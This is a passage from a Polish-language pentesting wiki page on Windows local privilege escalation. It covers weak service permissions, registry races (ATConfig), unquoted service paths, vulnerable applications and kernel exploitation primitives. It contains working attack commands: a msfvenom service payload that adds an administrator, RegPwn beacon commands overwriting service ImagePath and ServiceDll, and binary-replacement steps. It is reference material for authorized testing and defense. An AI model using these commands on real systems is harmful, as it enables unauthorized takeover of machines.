for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Poszukaj niebezpiecznych ACL-i przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza uprawnień **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny scenariusz nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi jej ponownie uruchomić, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję w przypadku awarii, która ponownie ją uruchamia, lub można ją wywołać pośrednio przez korzystającą z niej aplikację.

### Uprawnienia do modyfikacji rejestru usługi

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Pierwotny test uprawnień został sformułowany następująco:

Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia `FullControl`. Jeśli tak, można zmodyfikować plik binarny uruchamiany przez usługę.

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru danej usługi. Sam wpis ACL nie dowodzi, że dostęp jest efektywny: znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są odrębne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Eskalacja wymaga również odpowiedniego pola konfiguracji usługi, możliwości jej uruchomienia oraz tożsamości usługi z wyższymi uprawnieniami. Zobacz dokumentację Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić Path pliku binarnego uruchamianego przez usługę:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig dowiązania symbolicznego w rejestrze umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które później są kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig dowiązania symbolicznego** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość **zapisu dowolnej wartości** w HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść do bezpiecznego pulpitu i można w nim zapisywać jako użytkownik.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą ma zapisać SYSTEM.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), co uruchamia przepływ brokera AT.
3. **Wygraj wyścig**, ustawiając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy zadziała oplock, zastąp klucz **HKLM Session ATConfig** **łączem rejestru** prowadzącym do chronionego celu HKLM.
4. SYSTEM zapisuje wartość wybraną przez atakującego w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości w HKLM przejdź do LPE, nadpisując wartości konfiguracji usług:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows to **wystarczy, aby wykonać dowolny kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows będzie próbował uruchomić każdy jej fragment kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows będzie próbował uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie nieujęte w cudzysłowy ścieżki usług, z wyjątkiem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcje odzyskiwania

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, możliwa może być eskalacja uprawnień. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazywane przez zaplanowane zadania

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń powłoki wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący ma prawo zapisu, może umożliwić wykonanie kodu z konta innego użytkownika tylko wtedy, gdy skonfigurowany podmiot zadania różni się od wywołującego, a zadanie rzeczywiście wykonuje tę akcję. ACL pozwalający wyłącznie na dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane wiersze nie zostaną wykonane. Przed stwierdzeniem, że możliwa jest eskalacja, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Nazwane strumienie w dostępnych plikach

W NTFS czytelny plik może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna w zwykłym wykazie katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, czy strumień zawiera użyteczne dane uwierzytelniające oraz z jakim kontem są one faktycznie powiązane. Podczas rutynowej enumeracji unikaj rekursywnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit używanego przez zaplanowane zadania

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może korzystać z plików `command.txt`, `reboot.rsf` oraz pliku projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiająca ten pomocniczy program z kontem o wysokich uprawnieniach mogą umożliwić wykonanie poleceń w kontekście tego konta dzięki uprawnieniom zapisu użytkownika o niskich uprawnieniach do tych plików wejściowych, nawet jeśli sam plik wykonywalny jest zabezpieczony. Potwierdź, że pliki odczytuje uprzywilejowany proces oraz że **oba** pliki pomocnicze można utworzyć lub zmodyfikować; samo znalezienie pomocnika nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL obu ścieżek do plików pomocniczych. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do weryfikacji, a nie dowodem, że właśnie z tego miejsca zadanie odczytuje pliki wejściowe. Musi być również spełniony warunek dotyczący pliku roboczego projektu. Sprawdź rzeczywisty podmiot zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (może da się podmienić jeden z nich i przeprowadzić eskalację uprawnień) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk dla Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a gdy zastąpienie pliku się nie powiodło, uruchamiały istniejący plik chroniony przed zapisem. Producent naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny poziom poprawek zainstalowanej wersji oraz to, czy może zostać wykonana operacja agenta, której dotyczy problem; sama etykieta gałęzi, taka jak `2.1`, nie wystarcza do stwierdzenia podatności. Enumeracja może sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani wywoływania poleceń agenta.

#### Przegląd usługi SAML w ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło kompilacji ADSelfService Plus 6210 i starszych; producent naprawił problem w kompilacji 6211. Podatność ma znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie z uprawnieniami SYSTEM wymaga instancji działającej jako SYSTEM. Czytelny plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępne do użycia poświadczenia ani na tę podatność SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i uprawnienia dostępu, nie rozpakowując go.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins działającym w systemie Windows odróżnij uprawnienie do utworzenia lub skonfigurowania zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako odrębne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Zaplanowane uruchomienie lub zdalny wyzwalacz mogą stanowić inną drogę uruchomienia kompilacji, ale potwierdź, że są włączone i że kompilacja rzeczywiście działa. Wykonanie odbywa się z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie można wykorzystać tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane uwierzytelniające i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **uprawnienia do odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we współdzielonych wynikach. Jeśli to konto ma uprawnienie zapisu `scriptPath` obiektu użytkownika AD, przed uznaniem tego za wykonanie między użytkownikami potwierdź, że ścieżka skryptu jest zapisywalna oraz że istnieje rzeczywiste logowanie lub zaplanowany proces uruchamiający skrypt jako użytkownik docelowy. Dalsza kontrola grup wymaga osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość własnego agenta Azure Pipelines

W przypadku projektu Azure DevOps Server lub Azure Pipelines odróżnij uprawnienia do **utworzenia lub edycji** pipeline'u od uprawnień do jego **zakolejkowania** i użycia wybranej puli agentów; [Microsoft osobno opisuje uprawnienia pipeline'ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić ten pipeline na własnym agencie Windows, krok wykonuje się jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz przejście między użytkownikami lub uzyskanie uprawnień SYSTEM, zweryfikuj dokładny pipeline, ograniczenia gałęzi/zasobów, autoryzowaną pulę, możliwe do uruchomienia zadanie oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub sam dostęp do zapisu w repozytorium to tylko wskazówki; podczas pasywnej enumeracji przejrzyj uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie danych w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, lokalna grupa o nazwie sugerującej uprawnienia administratora lub widoczność bazy danych nie potwierdzają, że da się odszyfrować poświadczenie ani uzyskać uprawnienia w domenie. Osobno sprawdź rzeczywiste uprawnienia do odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wykazywać wyłącznie metadane usługi i dostępu, a nie odczytywać ani wypisywać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługujących sterownik drukarki

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź uprawnienia ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych oraz punktów ponownej analizy, nawet jeśli enumeracja WMI drukarek jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis problemu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie biblioteki DLL przez `PrintIsolationHost.exe`. Zapis w ACL to tylko wskazówka: zweryfikuj efektywny dostęp do zapisu po uwzględnieniu wpisów odmowy, to, czy właściwy sterownik jest zainstalowany i ładuje plik w kontekście uprzywilejowanej tożsamości, oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczającym. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu ani wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać określony plik, albo zmienić plik binarny, który ma zostać uruchomiony przez konto Administratora (schedtasks).

Słabe uprawnienia do folderów/plików w systemie można znaleźć w następujący sposób:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Automatyczne ładowanie pluginów Notepad++ — persistencja/wykonywanie

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów znajdujące się w podfolderach `plugins`. Jeśli dostępna jest instalacja przenośna lub jej kopia z możliwością zapisu, umieszczenie w niej złośliwego pluginu powoduje automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i funkcji zwrotnych pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie podczas startu

**Sprawdź, czy możesz nadpisać jakiś klucz rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autorunów umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnie **nietypowych/podatnych sterowników firm trzecich**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymityw dowolnego odczytu/zapisu w kernelu (co jest częste w źle zaprojektowanych obsługach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Opis techniki krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Powiązane materiały dotyczące eksploatacji Windows kernel:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów typu race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (przy użyciu komponentów o maksymalnej długości lub głęboko zagnieżdżonych łańcuchów katalogów) może wydłużyć okno z mikrosekund do kilkudziesięciu mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF w cancel-safe queue, ujawnienia z paged-pool i pivoty I/O ring

Niektóre łańcuchy LPE w Windows kernel można zbudować z dwóch osobno mało groźnych błędów: **race condition w cancel-safe queue**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal zajęta, oraz ujawnienia typu **zwolnienie blokady przed kopiowaniem**, które ujawnia zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i eksploatacji:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu wywoła `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolnione `PFLT_CALLBACK_DATA` do callbacku usuwającego sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries w `NPFS` są przydatne, ponieważ można kontrolować ich payload i rozmiar, a następnie sprawdzać je operacjami odczytu/podglądu pipe. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci user-mode**, aby sterownik wielokrotnie przetwarzał zdefiniowane przez atakującego struktury żądań zamiast kończyć działanie na pierwotnym początku listy.
- **Rozszerz przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis do kernela z kontrolowanym adresem, ale niekontrolowaną wartością. W takim przypadku zaatakuj pole **length/size** obiektu pool poddanego sprayowaniu, zamiast końcowego wskaźnika kodu/danych, a następnie przeszukaj obiekty sprayu, aż uszkodzony obiekt umożliwi odczyt poza zakresem z paged-pool.
- **Wzorzec podatnego na race condition ujawnienia**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność wzrasta, gdy atakujący może zwiększyć kopiowany bufor (na przykład dodając wiele wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę, niekoniecznie powodując awarię maszyny.
- **Cele uzupełniania zawierające wiele wskaźników**: tablice zarejestrowanych buforów Windows **I/O ring** są doskonałymi celami ujawnienia, ponieważ ich rozmiar w paged-pool można kontrolować (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring używały spreparowanych przez atakującego wpisów i zapewniały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis pozwala ustawić stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby zbudować wskaźnik user-mode z powtarzającym się bajtem, taki jak `0x0101010101010101`, zmapuj go przez `VirtualAlloc` i umieść tam spreparowaną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki podczas debugowania:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu do kernelu z uszkodzonego I/O ringa ukradnij token SYSTEM, stosując standardowy workflow po uzyskaniu primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives korupcji pamięci hive rejestru

Współczesne podatności hive pozwalają przygotować deterministyczny układ pamięci, wykorzystać zapisywalne elementy podrzędne HKLM/HKU i przekształcić korupcję metadanych w przepełnienia kernel paged-pool bez niestandardowego drivera. Pełny łańcuch znajdziesz tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie bezpośrednim `RtlQueryRegistryValues` na podstawie ścieżek kontrolowanych przez atakującego

Niektóre drivery akceptują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i przekazują wskaźnik do skalarnej zmiennej na stosie, takiej jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez dewelopera.

Daje to dwie przydatne primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ścieżka absolutna `\Registry\...` kontrolowana przez użytkownika pozwala driverowi odpytywać klucze wybrane przez atakującego, ujawniać ich istnienie przez kody zwrotne/logi, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: docelowa zmienna skalarna, taka jak `&readValue`, staje się podatna na pomylenie typów i jest traktowana jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze, zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** z użyciem `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploitacji, szukaj **kluczy zapisywalnych przez atakującego wewnątrz zaufanych hive systemowych**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie w zaufanym hive**: użyj NtObjectManager do wyszukania zapisywalnych elementów podrzędnych `\Registry\Machine`, a następnie ponownie uruchom skanowanie z duplikatem tokena **o niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxa:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callback/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowaną przez atakującego wartość `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, co umożliwia częściowo kontrolowany zapis w kernelu.
